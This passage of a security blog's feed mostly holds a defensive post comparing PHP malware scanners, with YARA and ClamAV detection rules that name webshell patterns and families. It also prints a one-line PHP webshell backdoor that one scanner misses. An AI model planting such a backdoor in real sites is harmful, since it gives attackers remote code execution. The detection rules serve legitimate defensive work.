&lt;p&gt;So in the end, &lt;strong&gt;the analyst would received 6598 alerts per day with only 99 true positive in it (1.5%)&lt;/strong&gt;. Your IDS is useless here. (Out of curiosity, the same problem applies when &lt;a href=&#34;http://www.jaddo.fr/2016/06/19/et-mes-fesses-elles-sont-roses-mes-fesses/&#34;&gt;detecting cancer at large scale&lt;/a&gt; (in French))&lt;/p&gt;

&lt;p&gt;If we take our example, a standard Windows 7 install has around 15000 binary files (it seems to be very different depending on the version, but let&amp;rsquo;s say 15000), which means that in average 97 files would be detected incorrectly as malicious. And that&amp;rsquo;s a bad antivirus.&lt;/p&gt;

&lt;h2 id=&#34;conclusion:97ad8feb5a1df3c1e8f583b33ab354cb&#34;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;So it was a fun example of machine learning utilization. I like how Pandas and Scikit make machine learning easy to use in python (and Scikit is really well explained and documented!). I was really surprised to have such good results without any effort for configuring the algorithm specifically for this context, and it shows that the Adobe tool is not as good as I thought.&lt;/p&gt;

&lt;p&gt;Still, it is interesting to remind the IDS problem and show it concretely (just after self-congratulation for such a good sensitivity :).&lt;/p&gt;

&lt;p&gt;If you have any question, comment or idea to continue playing with this dataset, let me know on &lt;a href=&#34;https://twitter.com/tenacioustek&#34;&gt;Twitter&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Here are some nice references on this topic:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://pandas.pydata.org/pandas-docs/stable/10min.html&#34;&gt;Learning Pandas in 10 minutes&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.socialcops.com/engineering/machine-learning-python&#34;&gt;Would You Survive the Titanic? A Guide to Machine Learning in Python&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://scikit-learn.org/stable/index.html&#34;&gt;Scikit Learn&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Adéu!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Edit 21/07/16: improved the dataset with more legitimate binaries. Updated the results&lt;/em&gt;
&lt;em&gt;Edit 02/08/16: explained why it&amp;rsquo;s not enough&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;This article was written mainly while listening Glenn Gould &lt;a href=&#34;https://www.youtube.com/watch?v=Ah392lnFHxM&#34;&gt;Goldberg Variations (1955)&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Comparison of php scanners</title>
      <link>https://www.randhome.io/blog/2016/05/14/comparison-of-php-scanners/</link>
      <pubDate>Sat, 14 May 2016 17:44:19 +0200</pubDate>
      
      <guid>https://www.randhome.io/blog/2016/05/14/comparison-of-php-scanners/</guid>
      <description>

&lt;p&gt;Hi there!&lt;/p&gt;

&lt;p&gt;I have recently looked different compromised websites on github, mostly using outdated Wordpress/Joomla/Drupal versions. In these cases, I often have to go through many different files to find the malicious one, whether added on the website or added to legitimate files. Here is a short summary of the different tools to detect them.&lt;/p&gt;

&lt;h2 id=&#34;clamav:90efb3b273830260aeb725b3431180e9&#34;&gt;ClamAV&lt;/h2&gt;

&lt;p&gt;&lt;center&gt;&lt;img src=&#34;https://www.randhome.io/media/clamav.png&#34; alt=&#34;clamav logo&#34; /&gt;&lt;/center&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://www.clamav.net/&#34;&gt;ClamAV&lt;/a&gt; is an open-source antivirus developed for different platform, but also one of the seldom antivirus used on Linux. It has a complex signature format with many open signature provided by the community (more than 3 700 000 according to wikipedia). And the good news, is that &lt;a href=&#34;http://blog.clamav.net/2015/06/clamav-099b-meets-yara.html&#34;&gt;it supports Yara&lt;/a&gt; since last year!&lt;/p&gt;

&lt;p&gt;It is possible to convert some of the clamav signature to Yara thanks to &lt;a href=&#34;https://github.com/Te-k/analyst-scripts/blob/master/tools/clamav_to_yara.py&#34;&gt;the nice script&lt;/a&gt; published in the Malware Analyst Cookbook by Michael Ligh, Steven Adair, Blake Hartstein, Matthew Richard :&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sigtool -u main.cvd
python clamav_to_yara.py -f main.ndb -o main.yara
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Clamav has several signatures related to php backdoors, like this nice one in daily.ldb (logical signatures in .ldb files are not converted by the previous script):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;Php.Malware.Mailbot-45;Engine:51-255,Target:7;0&amp;amp;1;6563686F207068705F6F732E{-35}275D2830393837363534333231292E;6563686F207068705F6F732E{-35}275D2832323232323232323232292E
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Shortly explained, this signature is a logical clamav signature with a format NAME;INFOS;CONDITION;PATTERN1;PATTERN2&amp;hellip;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The infos contains information on the clamav engine needed to read this signature and the type of target file (7 is ASCII file)&lt;/li&gt;
&lt;li&gt;The condition here is &lt;em&gt;0&amp;amp;1&lt;/em&gt; so both patterns should be present for the signature to match.&lt;/li&gt;
&lt;li&gt;Patterns are in hexadecimal format and {-XX} means that at most XX characters are not considered in the pattern. Apparently signatures on ascii files are case insensitive.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So we can convert this signature to the following yara signature&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;rule php_malware_mailbot_45 {
    strings:
        $a = /echo php_os\..{,35}&#39;\]\(0987654321\)\./ nocase
        $b = /echo php_os\..{,35}&#39;\]\(2222222222\)\./ nocase

    condition:
        all of them
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;linux-malware-detect:90efb3b273830260aeb725b3431180e9&#34;&gt;linux-malware-detect&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/rfxn/linux-malware-detect&#34;&gt;Linux Malware Detect&lt;/a&gt; uses signatures extracted from Clamav and other tools to detect malware, mainly based on md5 hashes of malicious files (and thus not very reliable). The tool was not updated since 2013 apparently, and according to the documentation it contained 8,908 MD5 / 1,914 signatures.&lt;/p&gt;

&lt;h2 id=&#34;php-malware-finder:90efb3b273830260aeb725b3431180e9&#34;&gt;php-malware-finder&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/nbs-system/php-malware-finder&#34;&gt;php-malware-finder&lt;/a&gt; is a tool developed by &lt;a href=&#34;https://www.nbs-system.com/&#34;&gt;NBS System&lt;/a&gt; based on &lt;a href=&#34;https://github.com/nbs-system/php-malware-finder/blob/master/php-malware-finder/phpmalwarefinder&#34;&gt;a simple shell script&lt;/a&gt; which rely mainly on Yara signatures to detect malicious files.&lt;/p&gt;

&lt;p&gt;This tool has some &lt;a href=&#34;https://github.com/nbs-system/php-malware-finder/blob/master/php-malware-finder/php.yar&#34;&gt;nice rules&lt;/a&gt; for instance for detecting obfuscated php:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;rule ObfuscatedPhp
{
    strings:
        $eval = /(&amp;lt;\?php|[;{}])[ \t]*@?(eval|preg_replace|system|assert|passthru|(pcntl_)?exec|win_shell_execute|call_user_func(_array)?)\s*\(/ nocase  // ;eval( &amp;lt;- this is dodgy
        $b374k = &amp;quot;&#39;ev&#39;.&#39;al&#39;&amp;quot;
        $align = /(\$\w+=[^;]*)*;\$\w+=@?\$\w+\(/  //b374k
        $weevely3 = /\$\w=\$[a-zA-Z]\(&#39;&#39;,\$\w\);\$\w\(\);/  // weevely3 launcher
        $c99_launcher = /;\$\w+\(\$\w+(,\s?\$\w+)+\);/  // http://bartblaze.blogspot.fr/2015/03/c99shell-not-dead.html
        $variable_variable = /\${\$[0-9a-zA-z]+}/
        $too_many_chr = /(chr\([\d]+\)\.){5}/  // concatenation of more than two `chr()`
        $concat = /(\$[^\n\r]+\.){5}/  // concatenation of more than 5 words
        $var_as_func = /\$_(GET|POST|COOKIE|REQUEST)\s*\[[^\]]+\]\s*\(/
        $gif = /^GIF89/
    condition:
        any of them and not IsWhitelisted
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The problem is that there is only generic methods (nothing designed for specific sample) so it misses a lot of samples (many basic webshells for instance), and some methods (like Dodgy php) are generating a lot of false positive.&lt;/p&gt;

&lt;h2 id=&#34;php-malware-scanner:90efb3b273830260aeb725b3431180e9&#34;&gt;php-malware-scanner&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/planet-work/php-malware-scanner&#34;&gt;php-malware-scanner&lt;/a&gt; has been developed by the french company &lt;a href=&#34;https://www.planet-work.com/&#34;&gt;planet-work&lt;/a&gt; likely to clean their own hosted websites and the result is pretty good.&lt;/p&gt;

&lt;p&gt;Their idea was too make a score with different parameters often identified in malicious php files, here is a short list as example :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;MANY_GLOBALS : Contains $GLOBALS many times (+20)&lt;/li&gt;
&lt;li&gt;MD5_VAR : contains a MD5 variable (+2)&lt;/li&gt;
&lt;li&gt;VERY_LONG_LINE_EARLY : the file has a first ver long line (+10)&lt;/li&gt;
&lt;li&gt;HAS_BASE64DECODE : has a function base64_decode() or str_rot13()&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This approach is nice, but the problem is that the code is real mess with a long list of if/else. Have a look:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;if re.compile(&#39;.*=\s*&amp;quot;http://[a-z0-9].*&amp;quot;;&#39;).match(l) or re.compile(&amp;quot;.*=\s*&#39;http:.*&#39;;&amp;quot;).match(l) :
    if not &#39;simpletest.org&#39; in l and not &#39;facebook.com&#39; in l:
	has_var_http = True
if has_var_http and (&#39;curl_exec&#39; in l or &#39;xxxxxxxxxx&#39; in l) and line_num &amp;lt; 20:
    score.append((&#39;CURL_HTTP&#39; ,&#39;&#39;))
if line_num &amp;lt; line_early and &#39;call_user_func&#39; in l:
    score.append((&#39;HAS_CALL_FUNC_EARLY&#39;,&#39;line %i&#39; % line_num))
if &#39;agent&#39; in l.lower() and &#39;google&#39; in l.lower():
    score.append((&#39;UA_GOOGLE&#39;,&#39;&#39;))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And even though they have added few signature directly in the code (hurrr), there are really few of them and the tool is often missing easy to detect samples. The following basic shell added to a legitimate php file would go undetected for instance:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php @preg_replace(&#39;/(.*)/e&#39;, @$_POST[&#39;abcdef&#39;], &#39;&#39;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here is an example of result by this tool (you should add a &amp;ndash;minscore option, 10 seems to be a good value):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{
        &amp;quot;score&amp;quot;: 15,
        &amp;quot;filename&amp;quot;: &amp;quot;/home/etienne/perso/fun/new-caffe/./public/wp-includes/images/crystal/epsg8vpeff.php&amp;quot;,
        &amp;quot;cleanup&amp;quot;: false,
        &amp;quot;details&amp;quot;: [
            {
                &amp;quot;score&amp;quot;: 5,
                &amp;quot;details&amp;quot;: &amp;quot;&amp;quot;,
                &amp;quot;rule&amp;quot;: &amp;quot;UA_GOOGLE&amp;quot;,
                &amp;quot;description&amp;quot;: &amp;quot;V\u00e9rifie le User-Agent contre Google&amp;quot;
            },
            {
                &amp;quot;score&amp;quot;: 10,
                &amp;quot;details&amp;quot;: &amp;quot;line 1&amp;quot;,
                &amp;quot;rule&amp;quot;: &amp;quot;VERY_LONG_LINE_EARLY&amp;quot;,
                &amp;quot;description&amp;quot;: &amp;quot;Contient une ligne de plus de 3000 caract\u00e8res en d\u00e9but de fichier&amp;quot;
            },
            {
                &amp;quot;score&amp;quot;: 0,
                &amp;quot;details&amp;quot;: &amp;quot;1 lines&amp;quot;,
                &amp;quot;rule&amp;quot;: &amp;quot;FEW_LINES&amp;quot;,
                &amp;quot;description&amp;quot;: &amp;quot;Contient peu de lignes&amp;quot;
            }
        ],
        &amp;quot;mtime&amp;quot;: 1463402470.307976,
        &amp;quot;ctime&amp;quot;: 1463402470.307976
    }
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;comparison:90efb3b273830260aeb725b3431180e9&#34;&gt;Comparison&lt;/h2&gt;

&lt;p&gt;I have tested these tools on a wordpress website which has 38 different malicious files (mainly simple backdoors but also mass mailers or other malicious files).&lt;/p&gt;

&lt;p&gt;&lt;center&gt;&lt;img src=&#34;https://www.randhome.io/media/doctor1.jpg&#34; alt=&#34;Doctor&#34; /&gt;&lt;/center&gt;&lt;/p&gt;

&lt;p&gt;Here are the results:&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Tool&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;True Positive&lt;/th&gt;
&lt;th align=&#34;right&#34;&gt;False Positive&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Linux Malware Detect&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;4 / 39&lt;/td&gt;
&lt;td align=&#34;right&#34;&gt;0&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;ClamAV (default)&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;4 / 39&lt;/td&gt;
&lt;td align=&#34;right&#34;&gt;0&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;php-malware-finder&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;28 / 39&lt;/td&gt;
&lt;td align=&#34;right&#34;&gt;126&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;php-malware-scanner (minscore 10)&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10 / 39&lt;/td&gt;
&lt;td align=&#34;right&#34;&gt;0&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;So nothing is perfect, likely something to do to improve these results.&lt;/p&gt;

&lt;p&gt;Hasta Luego!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>#references</title>
      <link>https://www.randhome.io/references/</link>
      <pubDate>Thu, 05 May 2016 01:07:16 +0200</pubDate>
      
      <guid>https://www.randhome.io/references/</guid>
      <description>

&lt;p&gt;Here is a list of references regarding security topics and hacktivism:&lt;/p&gt;

&lt;h2 id=&#34;political-organizations:95fc2e7abab391a8a595860a64f5b737&#34;&gt;Political Organizations&lt;/h2&gt;

&lt;p&gt;Here are several awesome organization regarding online freedom:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;EFF&lt;/strong&gt; : The Electronic Frontier Foundation fights for digital freedom in many different ways (legal fights, press review, development of technical tools&amp;hellip;). See their &lt;a href=&#34;https://www.eff.org/&#34;&gt;website&lt;/a&gt; and their &lt;a href=&#34;https://twitter.com/EFF&#34;&gt;Twitter account&lt;/a&gt;. Here is a list of EFF projects I like:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://letsencrypt.org/&#34;&gt;Let&amp;rsquo;s Encrypt&lt;/a&gt; is a free certificate authority&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.eff.org/en/privacybadger&#34;&gt;Privacy badger&lt;/a&gt; is a Chrome/Firefox extension to block spying ads and invisible trackers&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.eff.org/https-everywhere&#34;&gt;HTTPs Everywhere&lt;/a&gt; is a browser extension to use HTTPs by default on main websites&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;Citizen Lab&lt;/strong&gt; is a research group based in the University of Toronto which focus its researchs on human rights and digital surveillance. They have done amazing analysis of targeted attacks by governments on citizen (like &lt;a href=&#34;https://citizenlab.org/2016/04/between-hong-kong-and-burma/&#34;&gt;this one&lt;/a&gt; or &lt;a href=&#34;https://citizenlab.org/2016/03/shifting-tactics/&#34;&gt;this one&lt;/a&gt;). See &lt;a href=&#34;https://citizenlab.org/&#34;&gt;their website&lt;/a&gt; or &lt;a href=&#34;https://twitter.com/CitizenLab&#34;&gt;twitter account&lt;/a&gt;.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;La Quadrature Du Net&lt;/strong&gt; is a French political movement for digital freedom especially in France and Europe. See &lt;a href=&#34;https://www.laquadrature.net/fr&#34;&gt;their website&lt;/a&gt; or &lt;a href=&#34;https://twitter.com/laquadrature&#34;&gt;Twitter account&lt;/a&gt;.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;security-resources:95fc2e7abab391a8a595860a64f5b737&#34;&gt;Security Resources&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;After all these years, &lt;a href=&#34;https://www.schneier.com/&#34;&gt;Bruce Schneier&amp;rsquo;s blog&lt;/a&gt; is still a very good resource regarding cryptography and surveillance topics.&lt;/li&gt;
&lt;li&gt;Matthew Green and his &lt;a href=&#34;http://blog.cryptographyengineering.com/&#34;&gt;Cryptography Engineering blog&lt;/a&gt; contains very good articles related to cryptography.&lt;/li&gt;
&lt;li&gt;I like the diversity and fun of &lt;a href=&#34;http://krebsonsecurity.com/&#34;&gt;Krebs On Security&lt;/a&gt; articles, always interesting to read.&lt;/li&gt;
&lt;li&gt;The &lt;a href=&#34;https://isc.sans.edu/&#34;&gt;SANS Internet Storm Center&lt;/a&gt; is nice to follow new vulnerabilities or evolution of malware and threats.&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>#whoami</title>
      <link>https://www.randhome.io/about/</link>
      <pubDate>Fri, 29 Apr 2016 14:51:26 +0200</pubDate>
      
      <guid>https://www.randhome.io/about/</guid>
      <description>&lt;p&gt;Hi there!
I&amp;rsquo;m a security enthusiastic self-named &amp;ldquo;Tek&amp;rdquo; especially interested in the impact of technology over human rights and freedom. You will find in this blog random security stuff likely related to attacks by governments against their citizen but also funny stuff found here and there.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.randhome.io/media/doctor2.jpg&#34; alt=&#34;Doctor&#34; /&gt;&lt;/p&gt;

&lt;p&gt;You can contact me at tek &lt;em&gt;AT&lt;/em&gt; randhome &lt;em&gt;DOT&lt;/em&gt; io using &lt;a href=&#34;https://www.randhome.io/key.txt&#34;&gt;my public GPG key&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can find me on IRC:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;on freenode on #laquadrature as [Tek]&lt;/li&gt;
&lt;li&gt;on OFTC on #tor as [Tek]&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
  </channel>
</rss>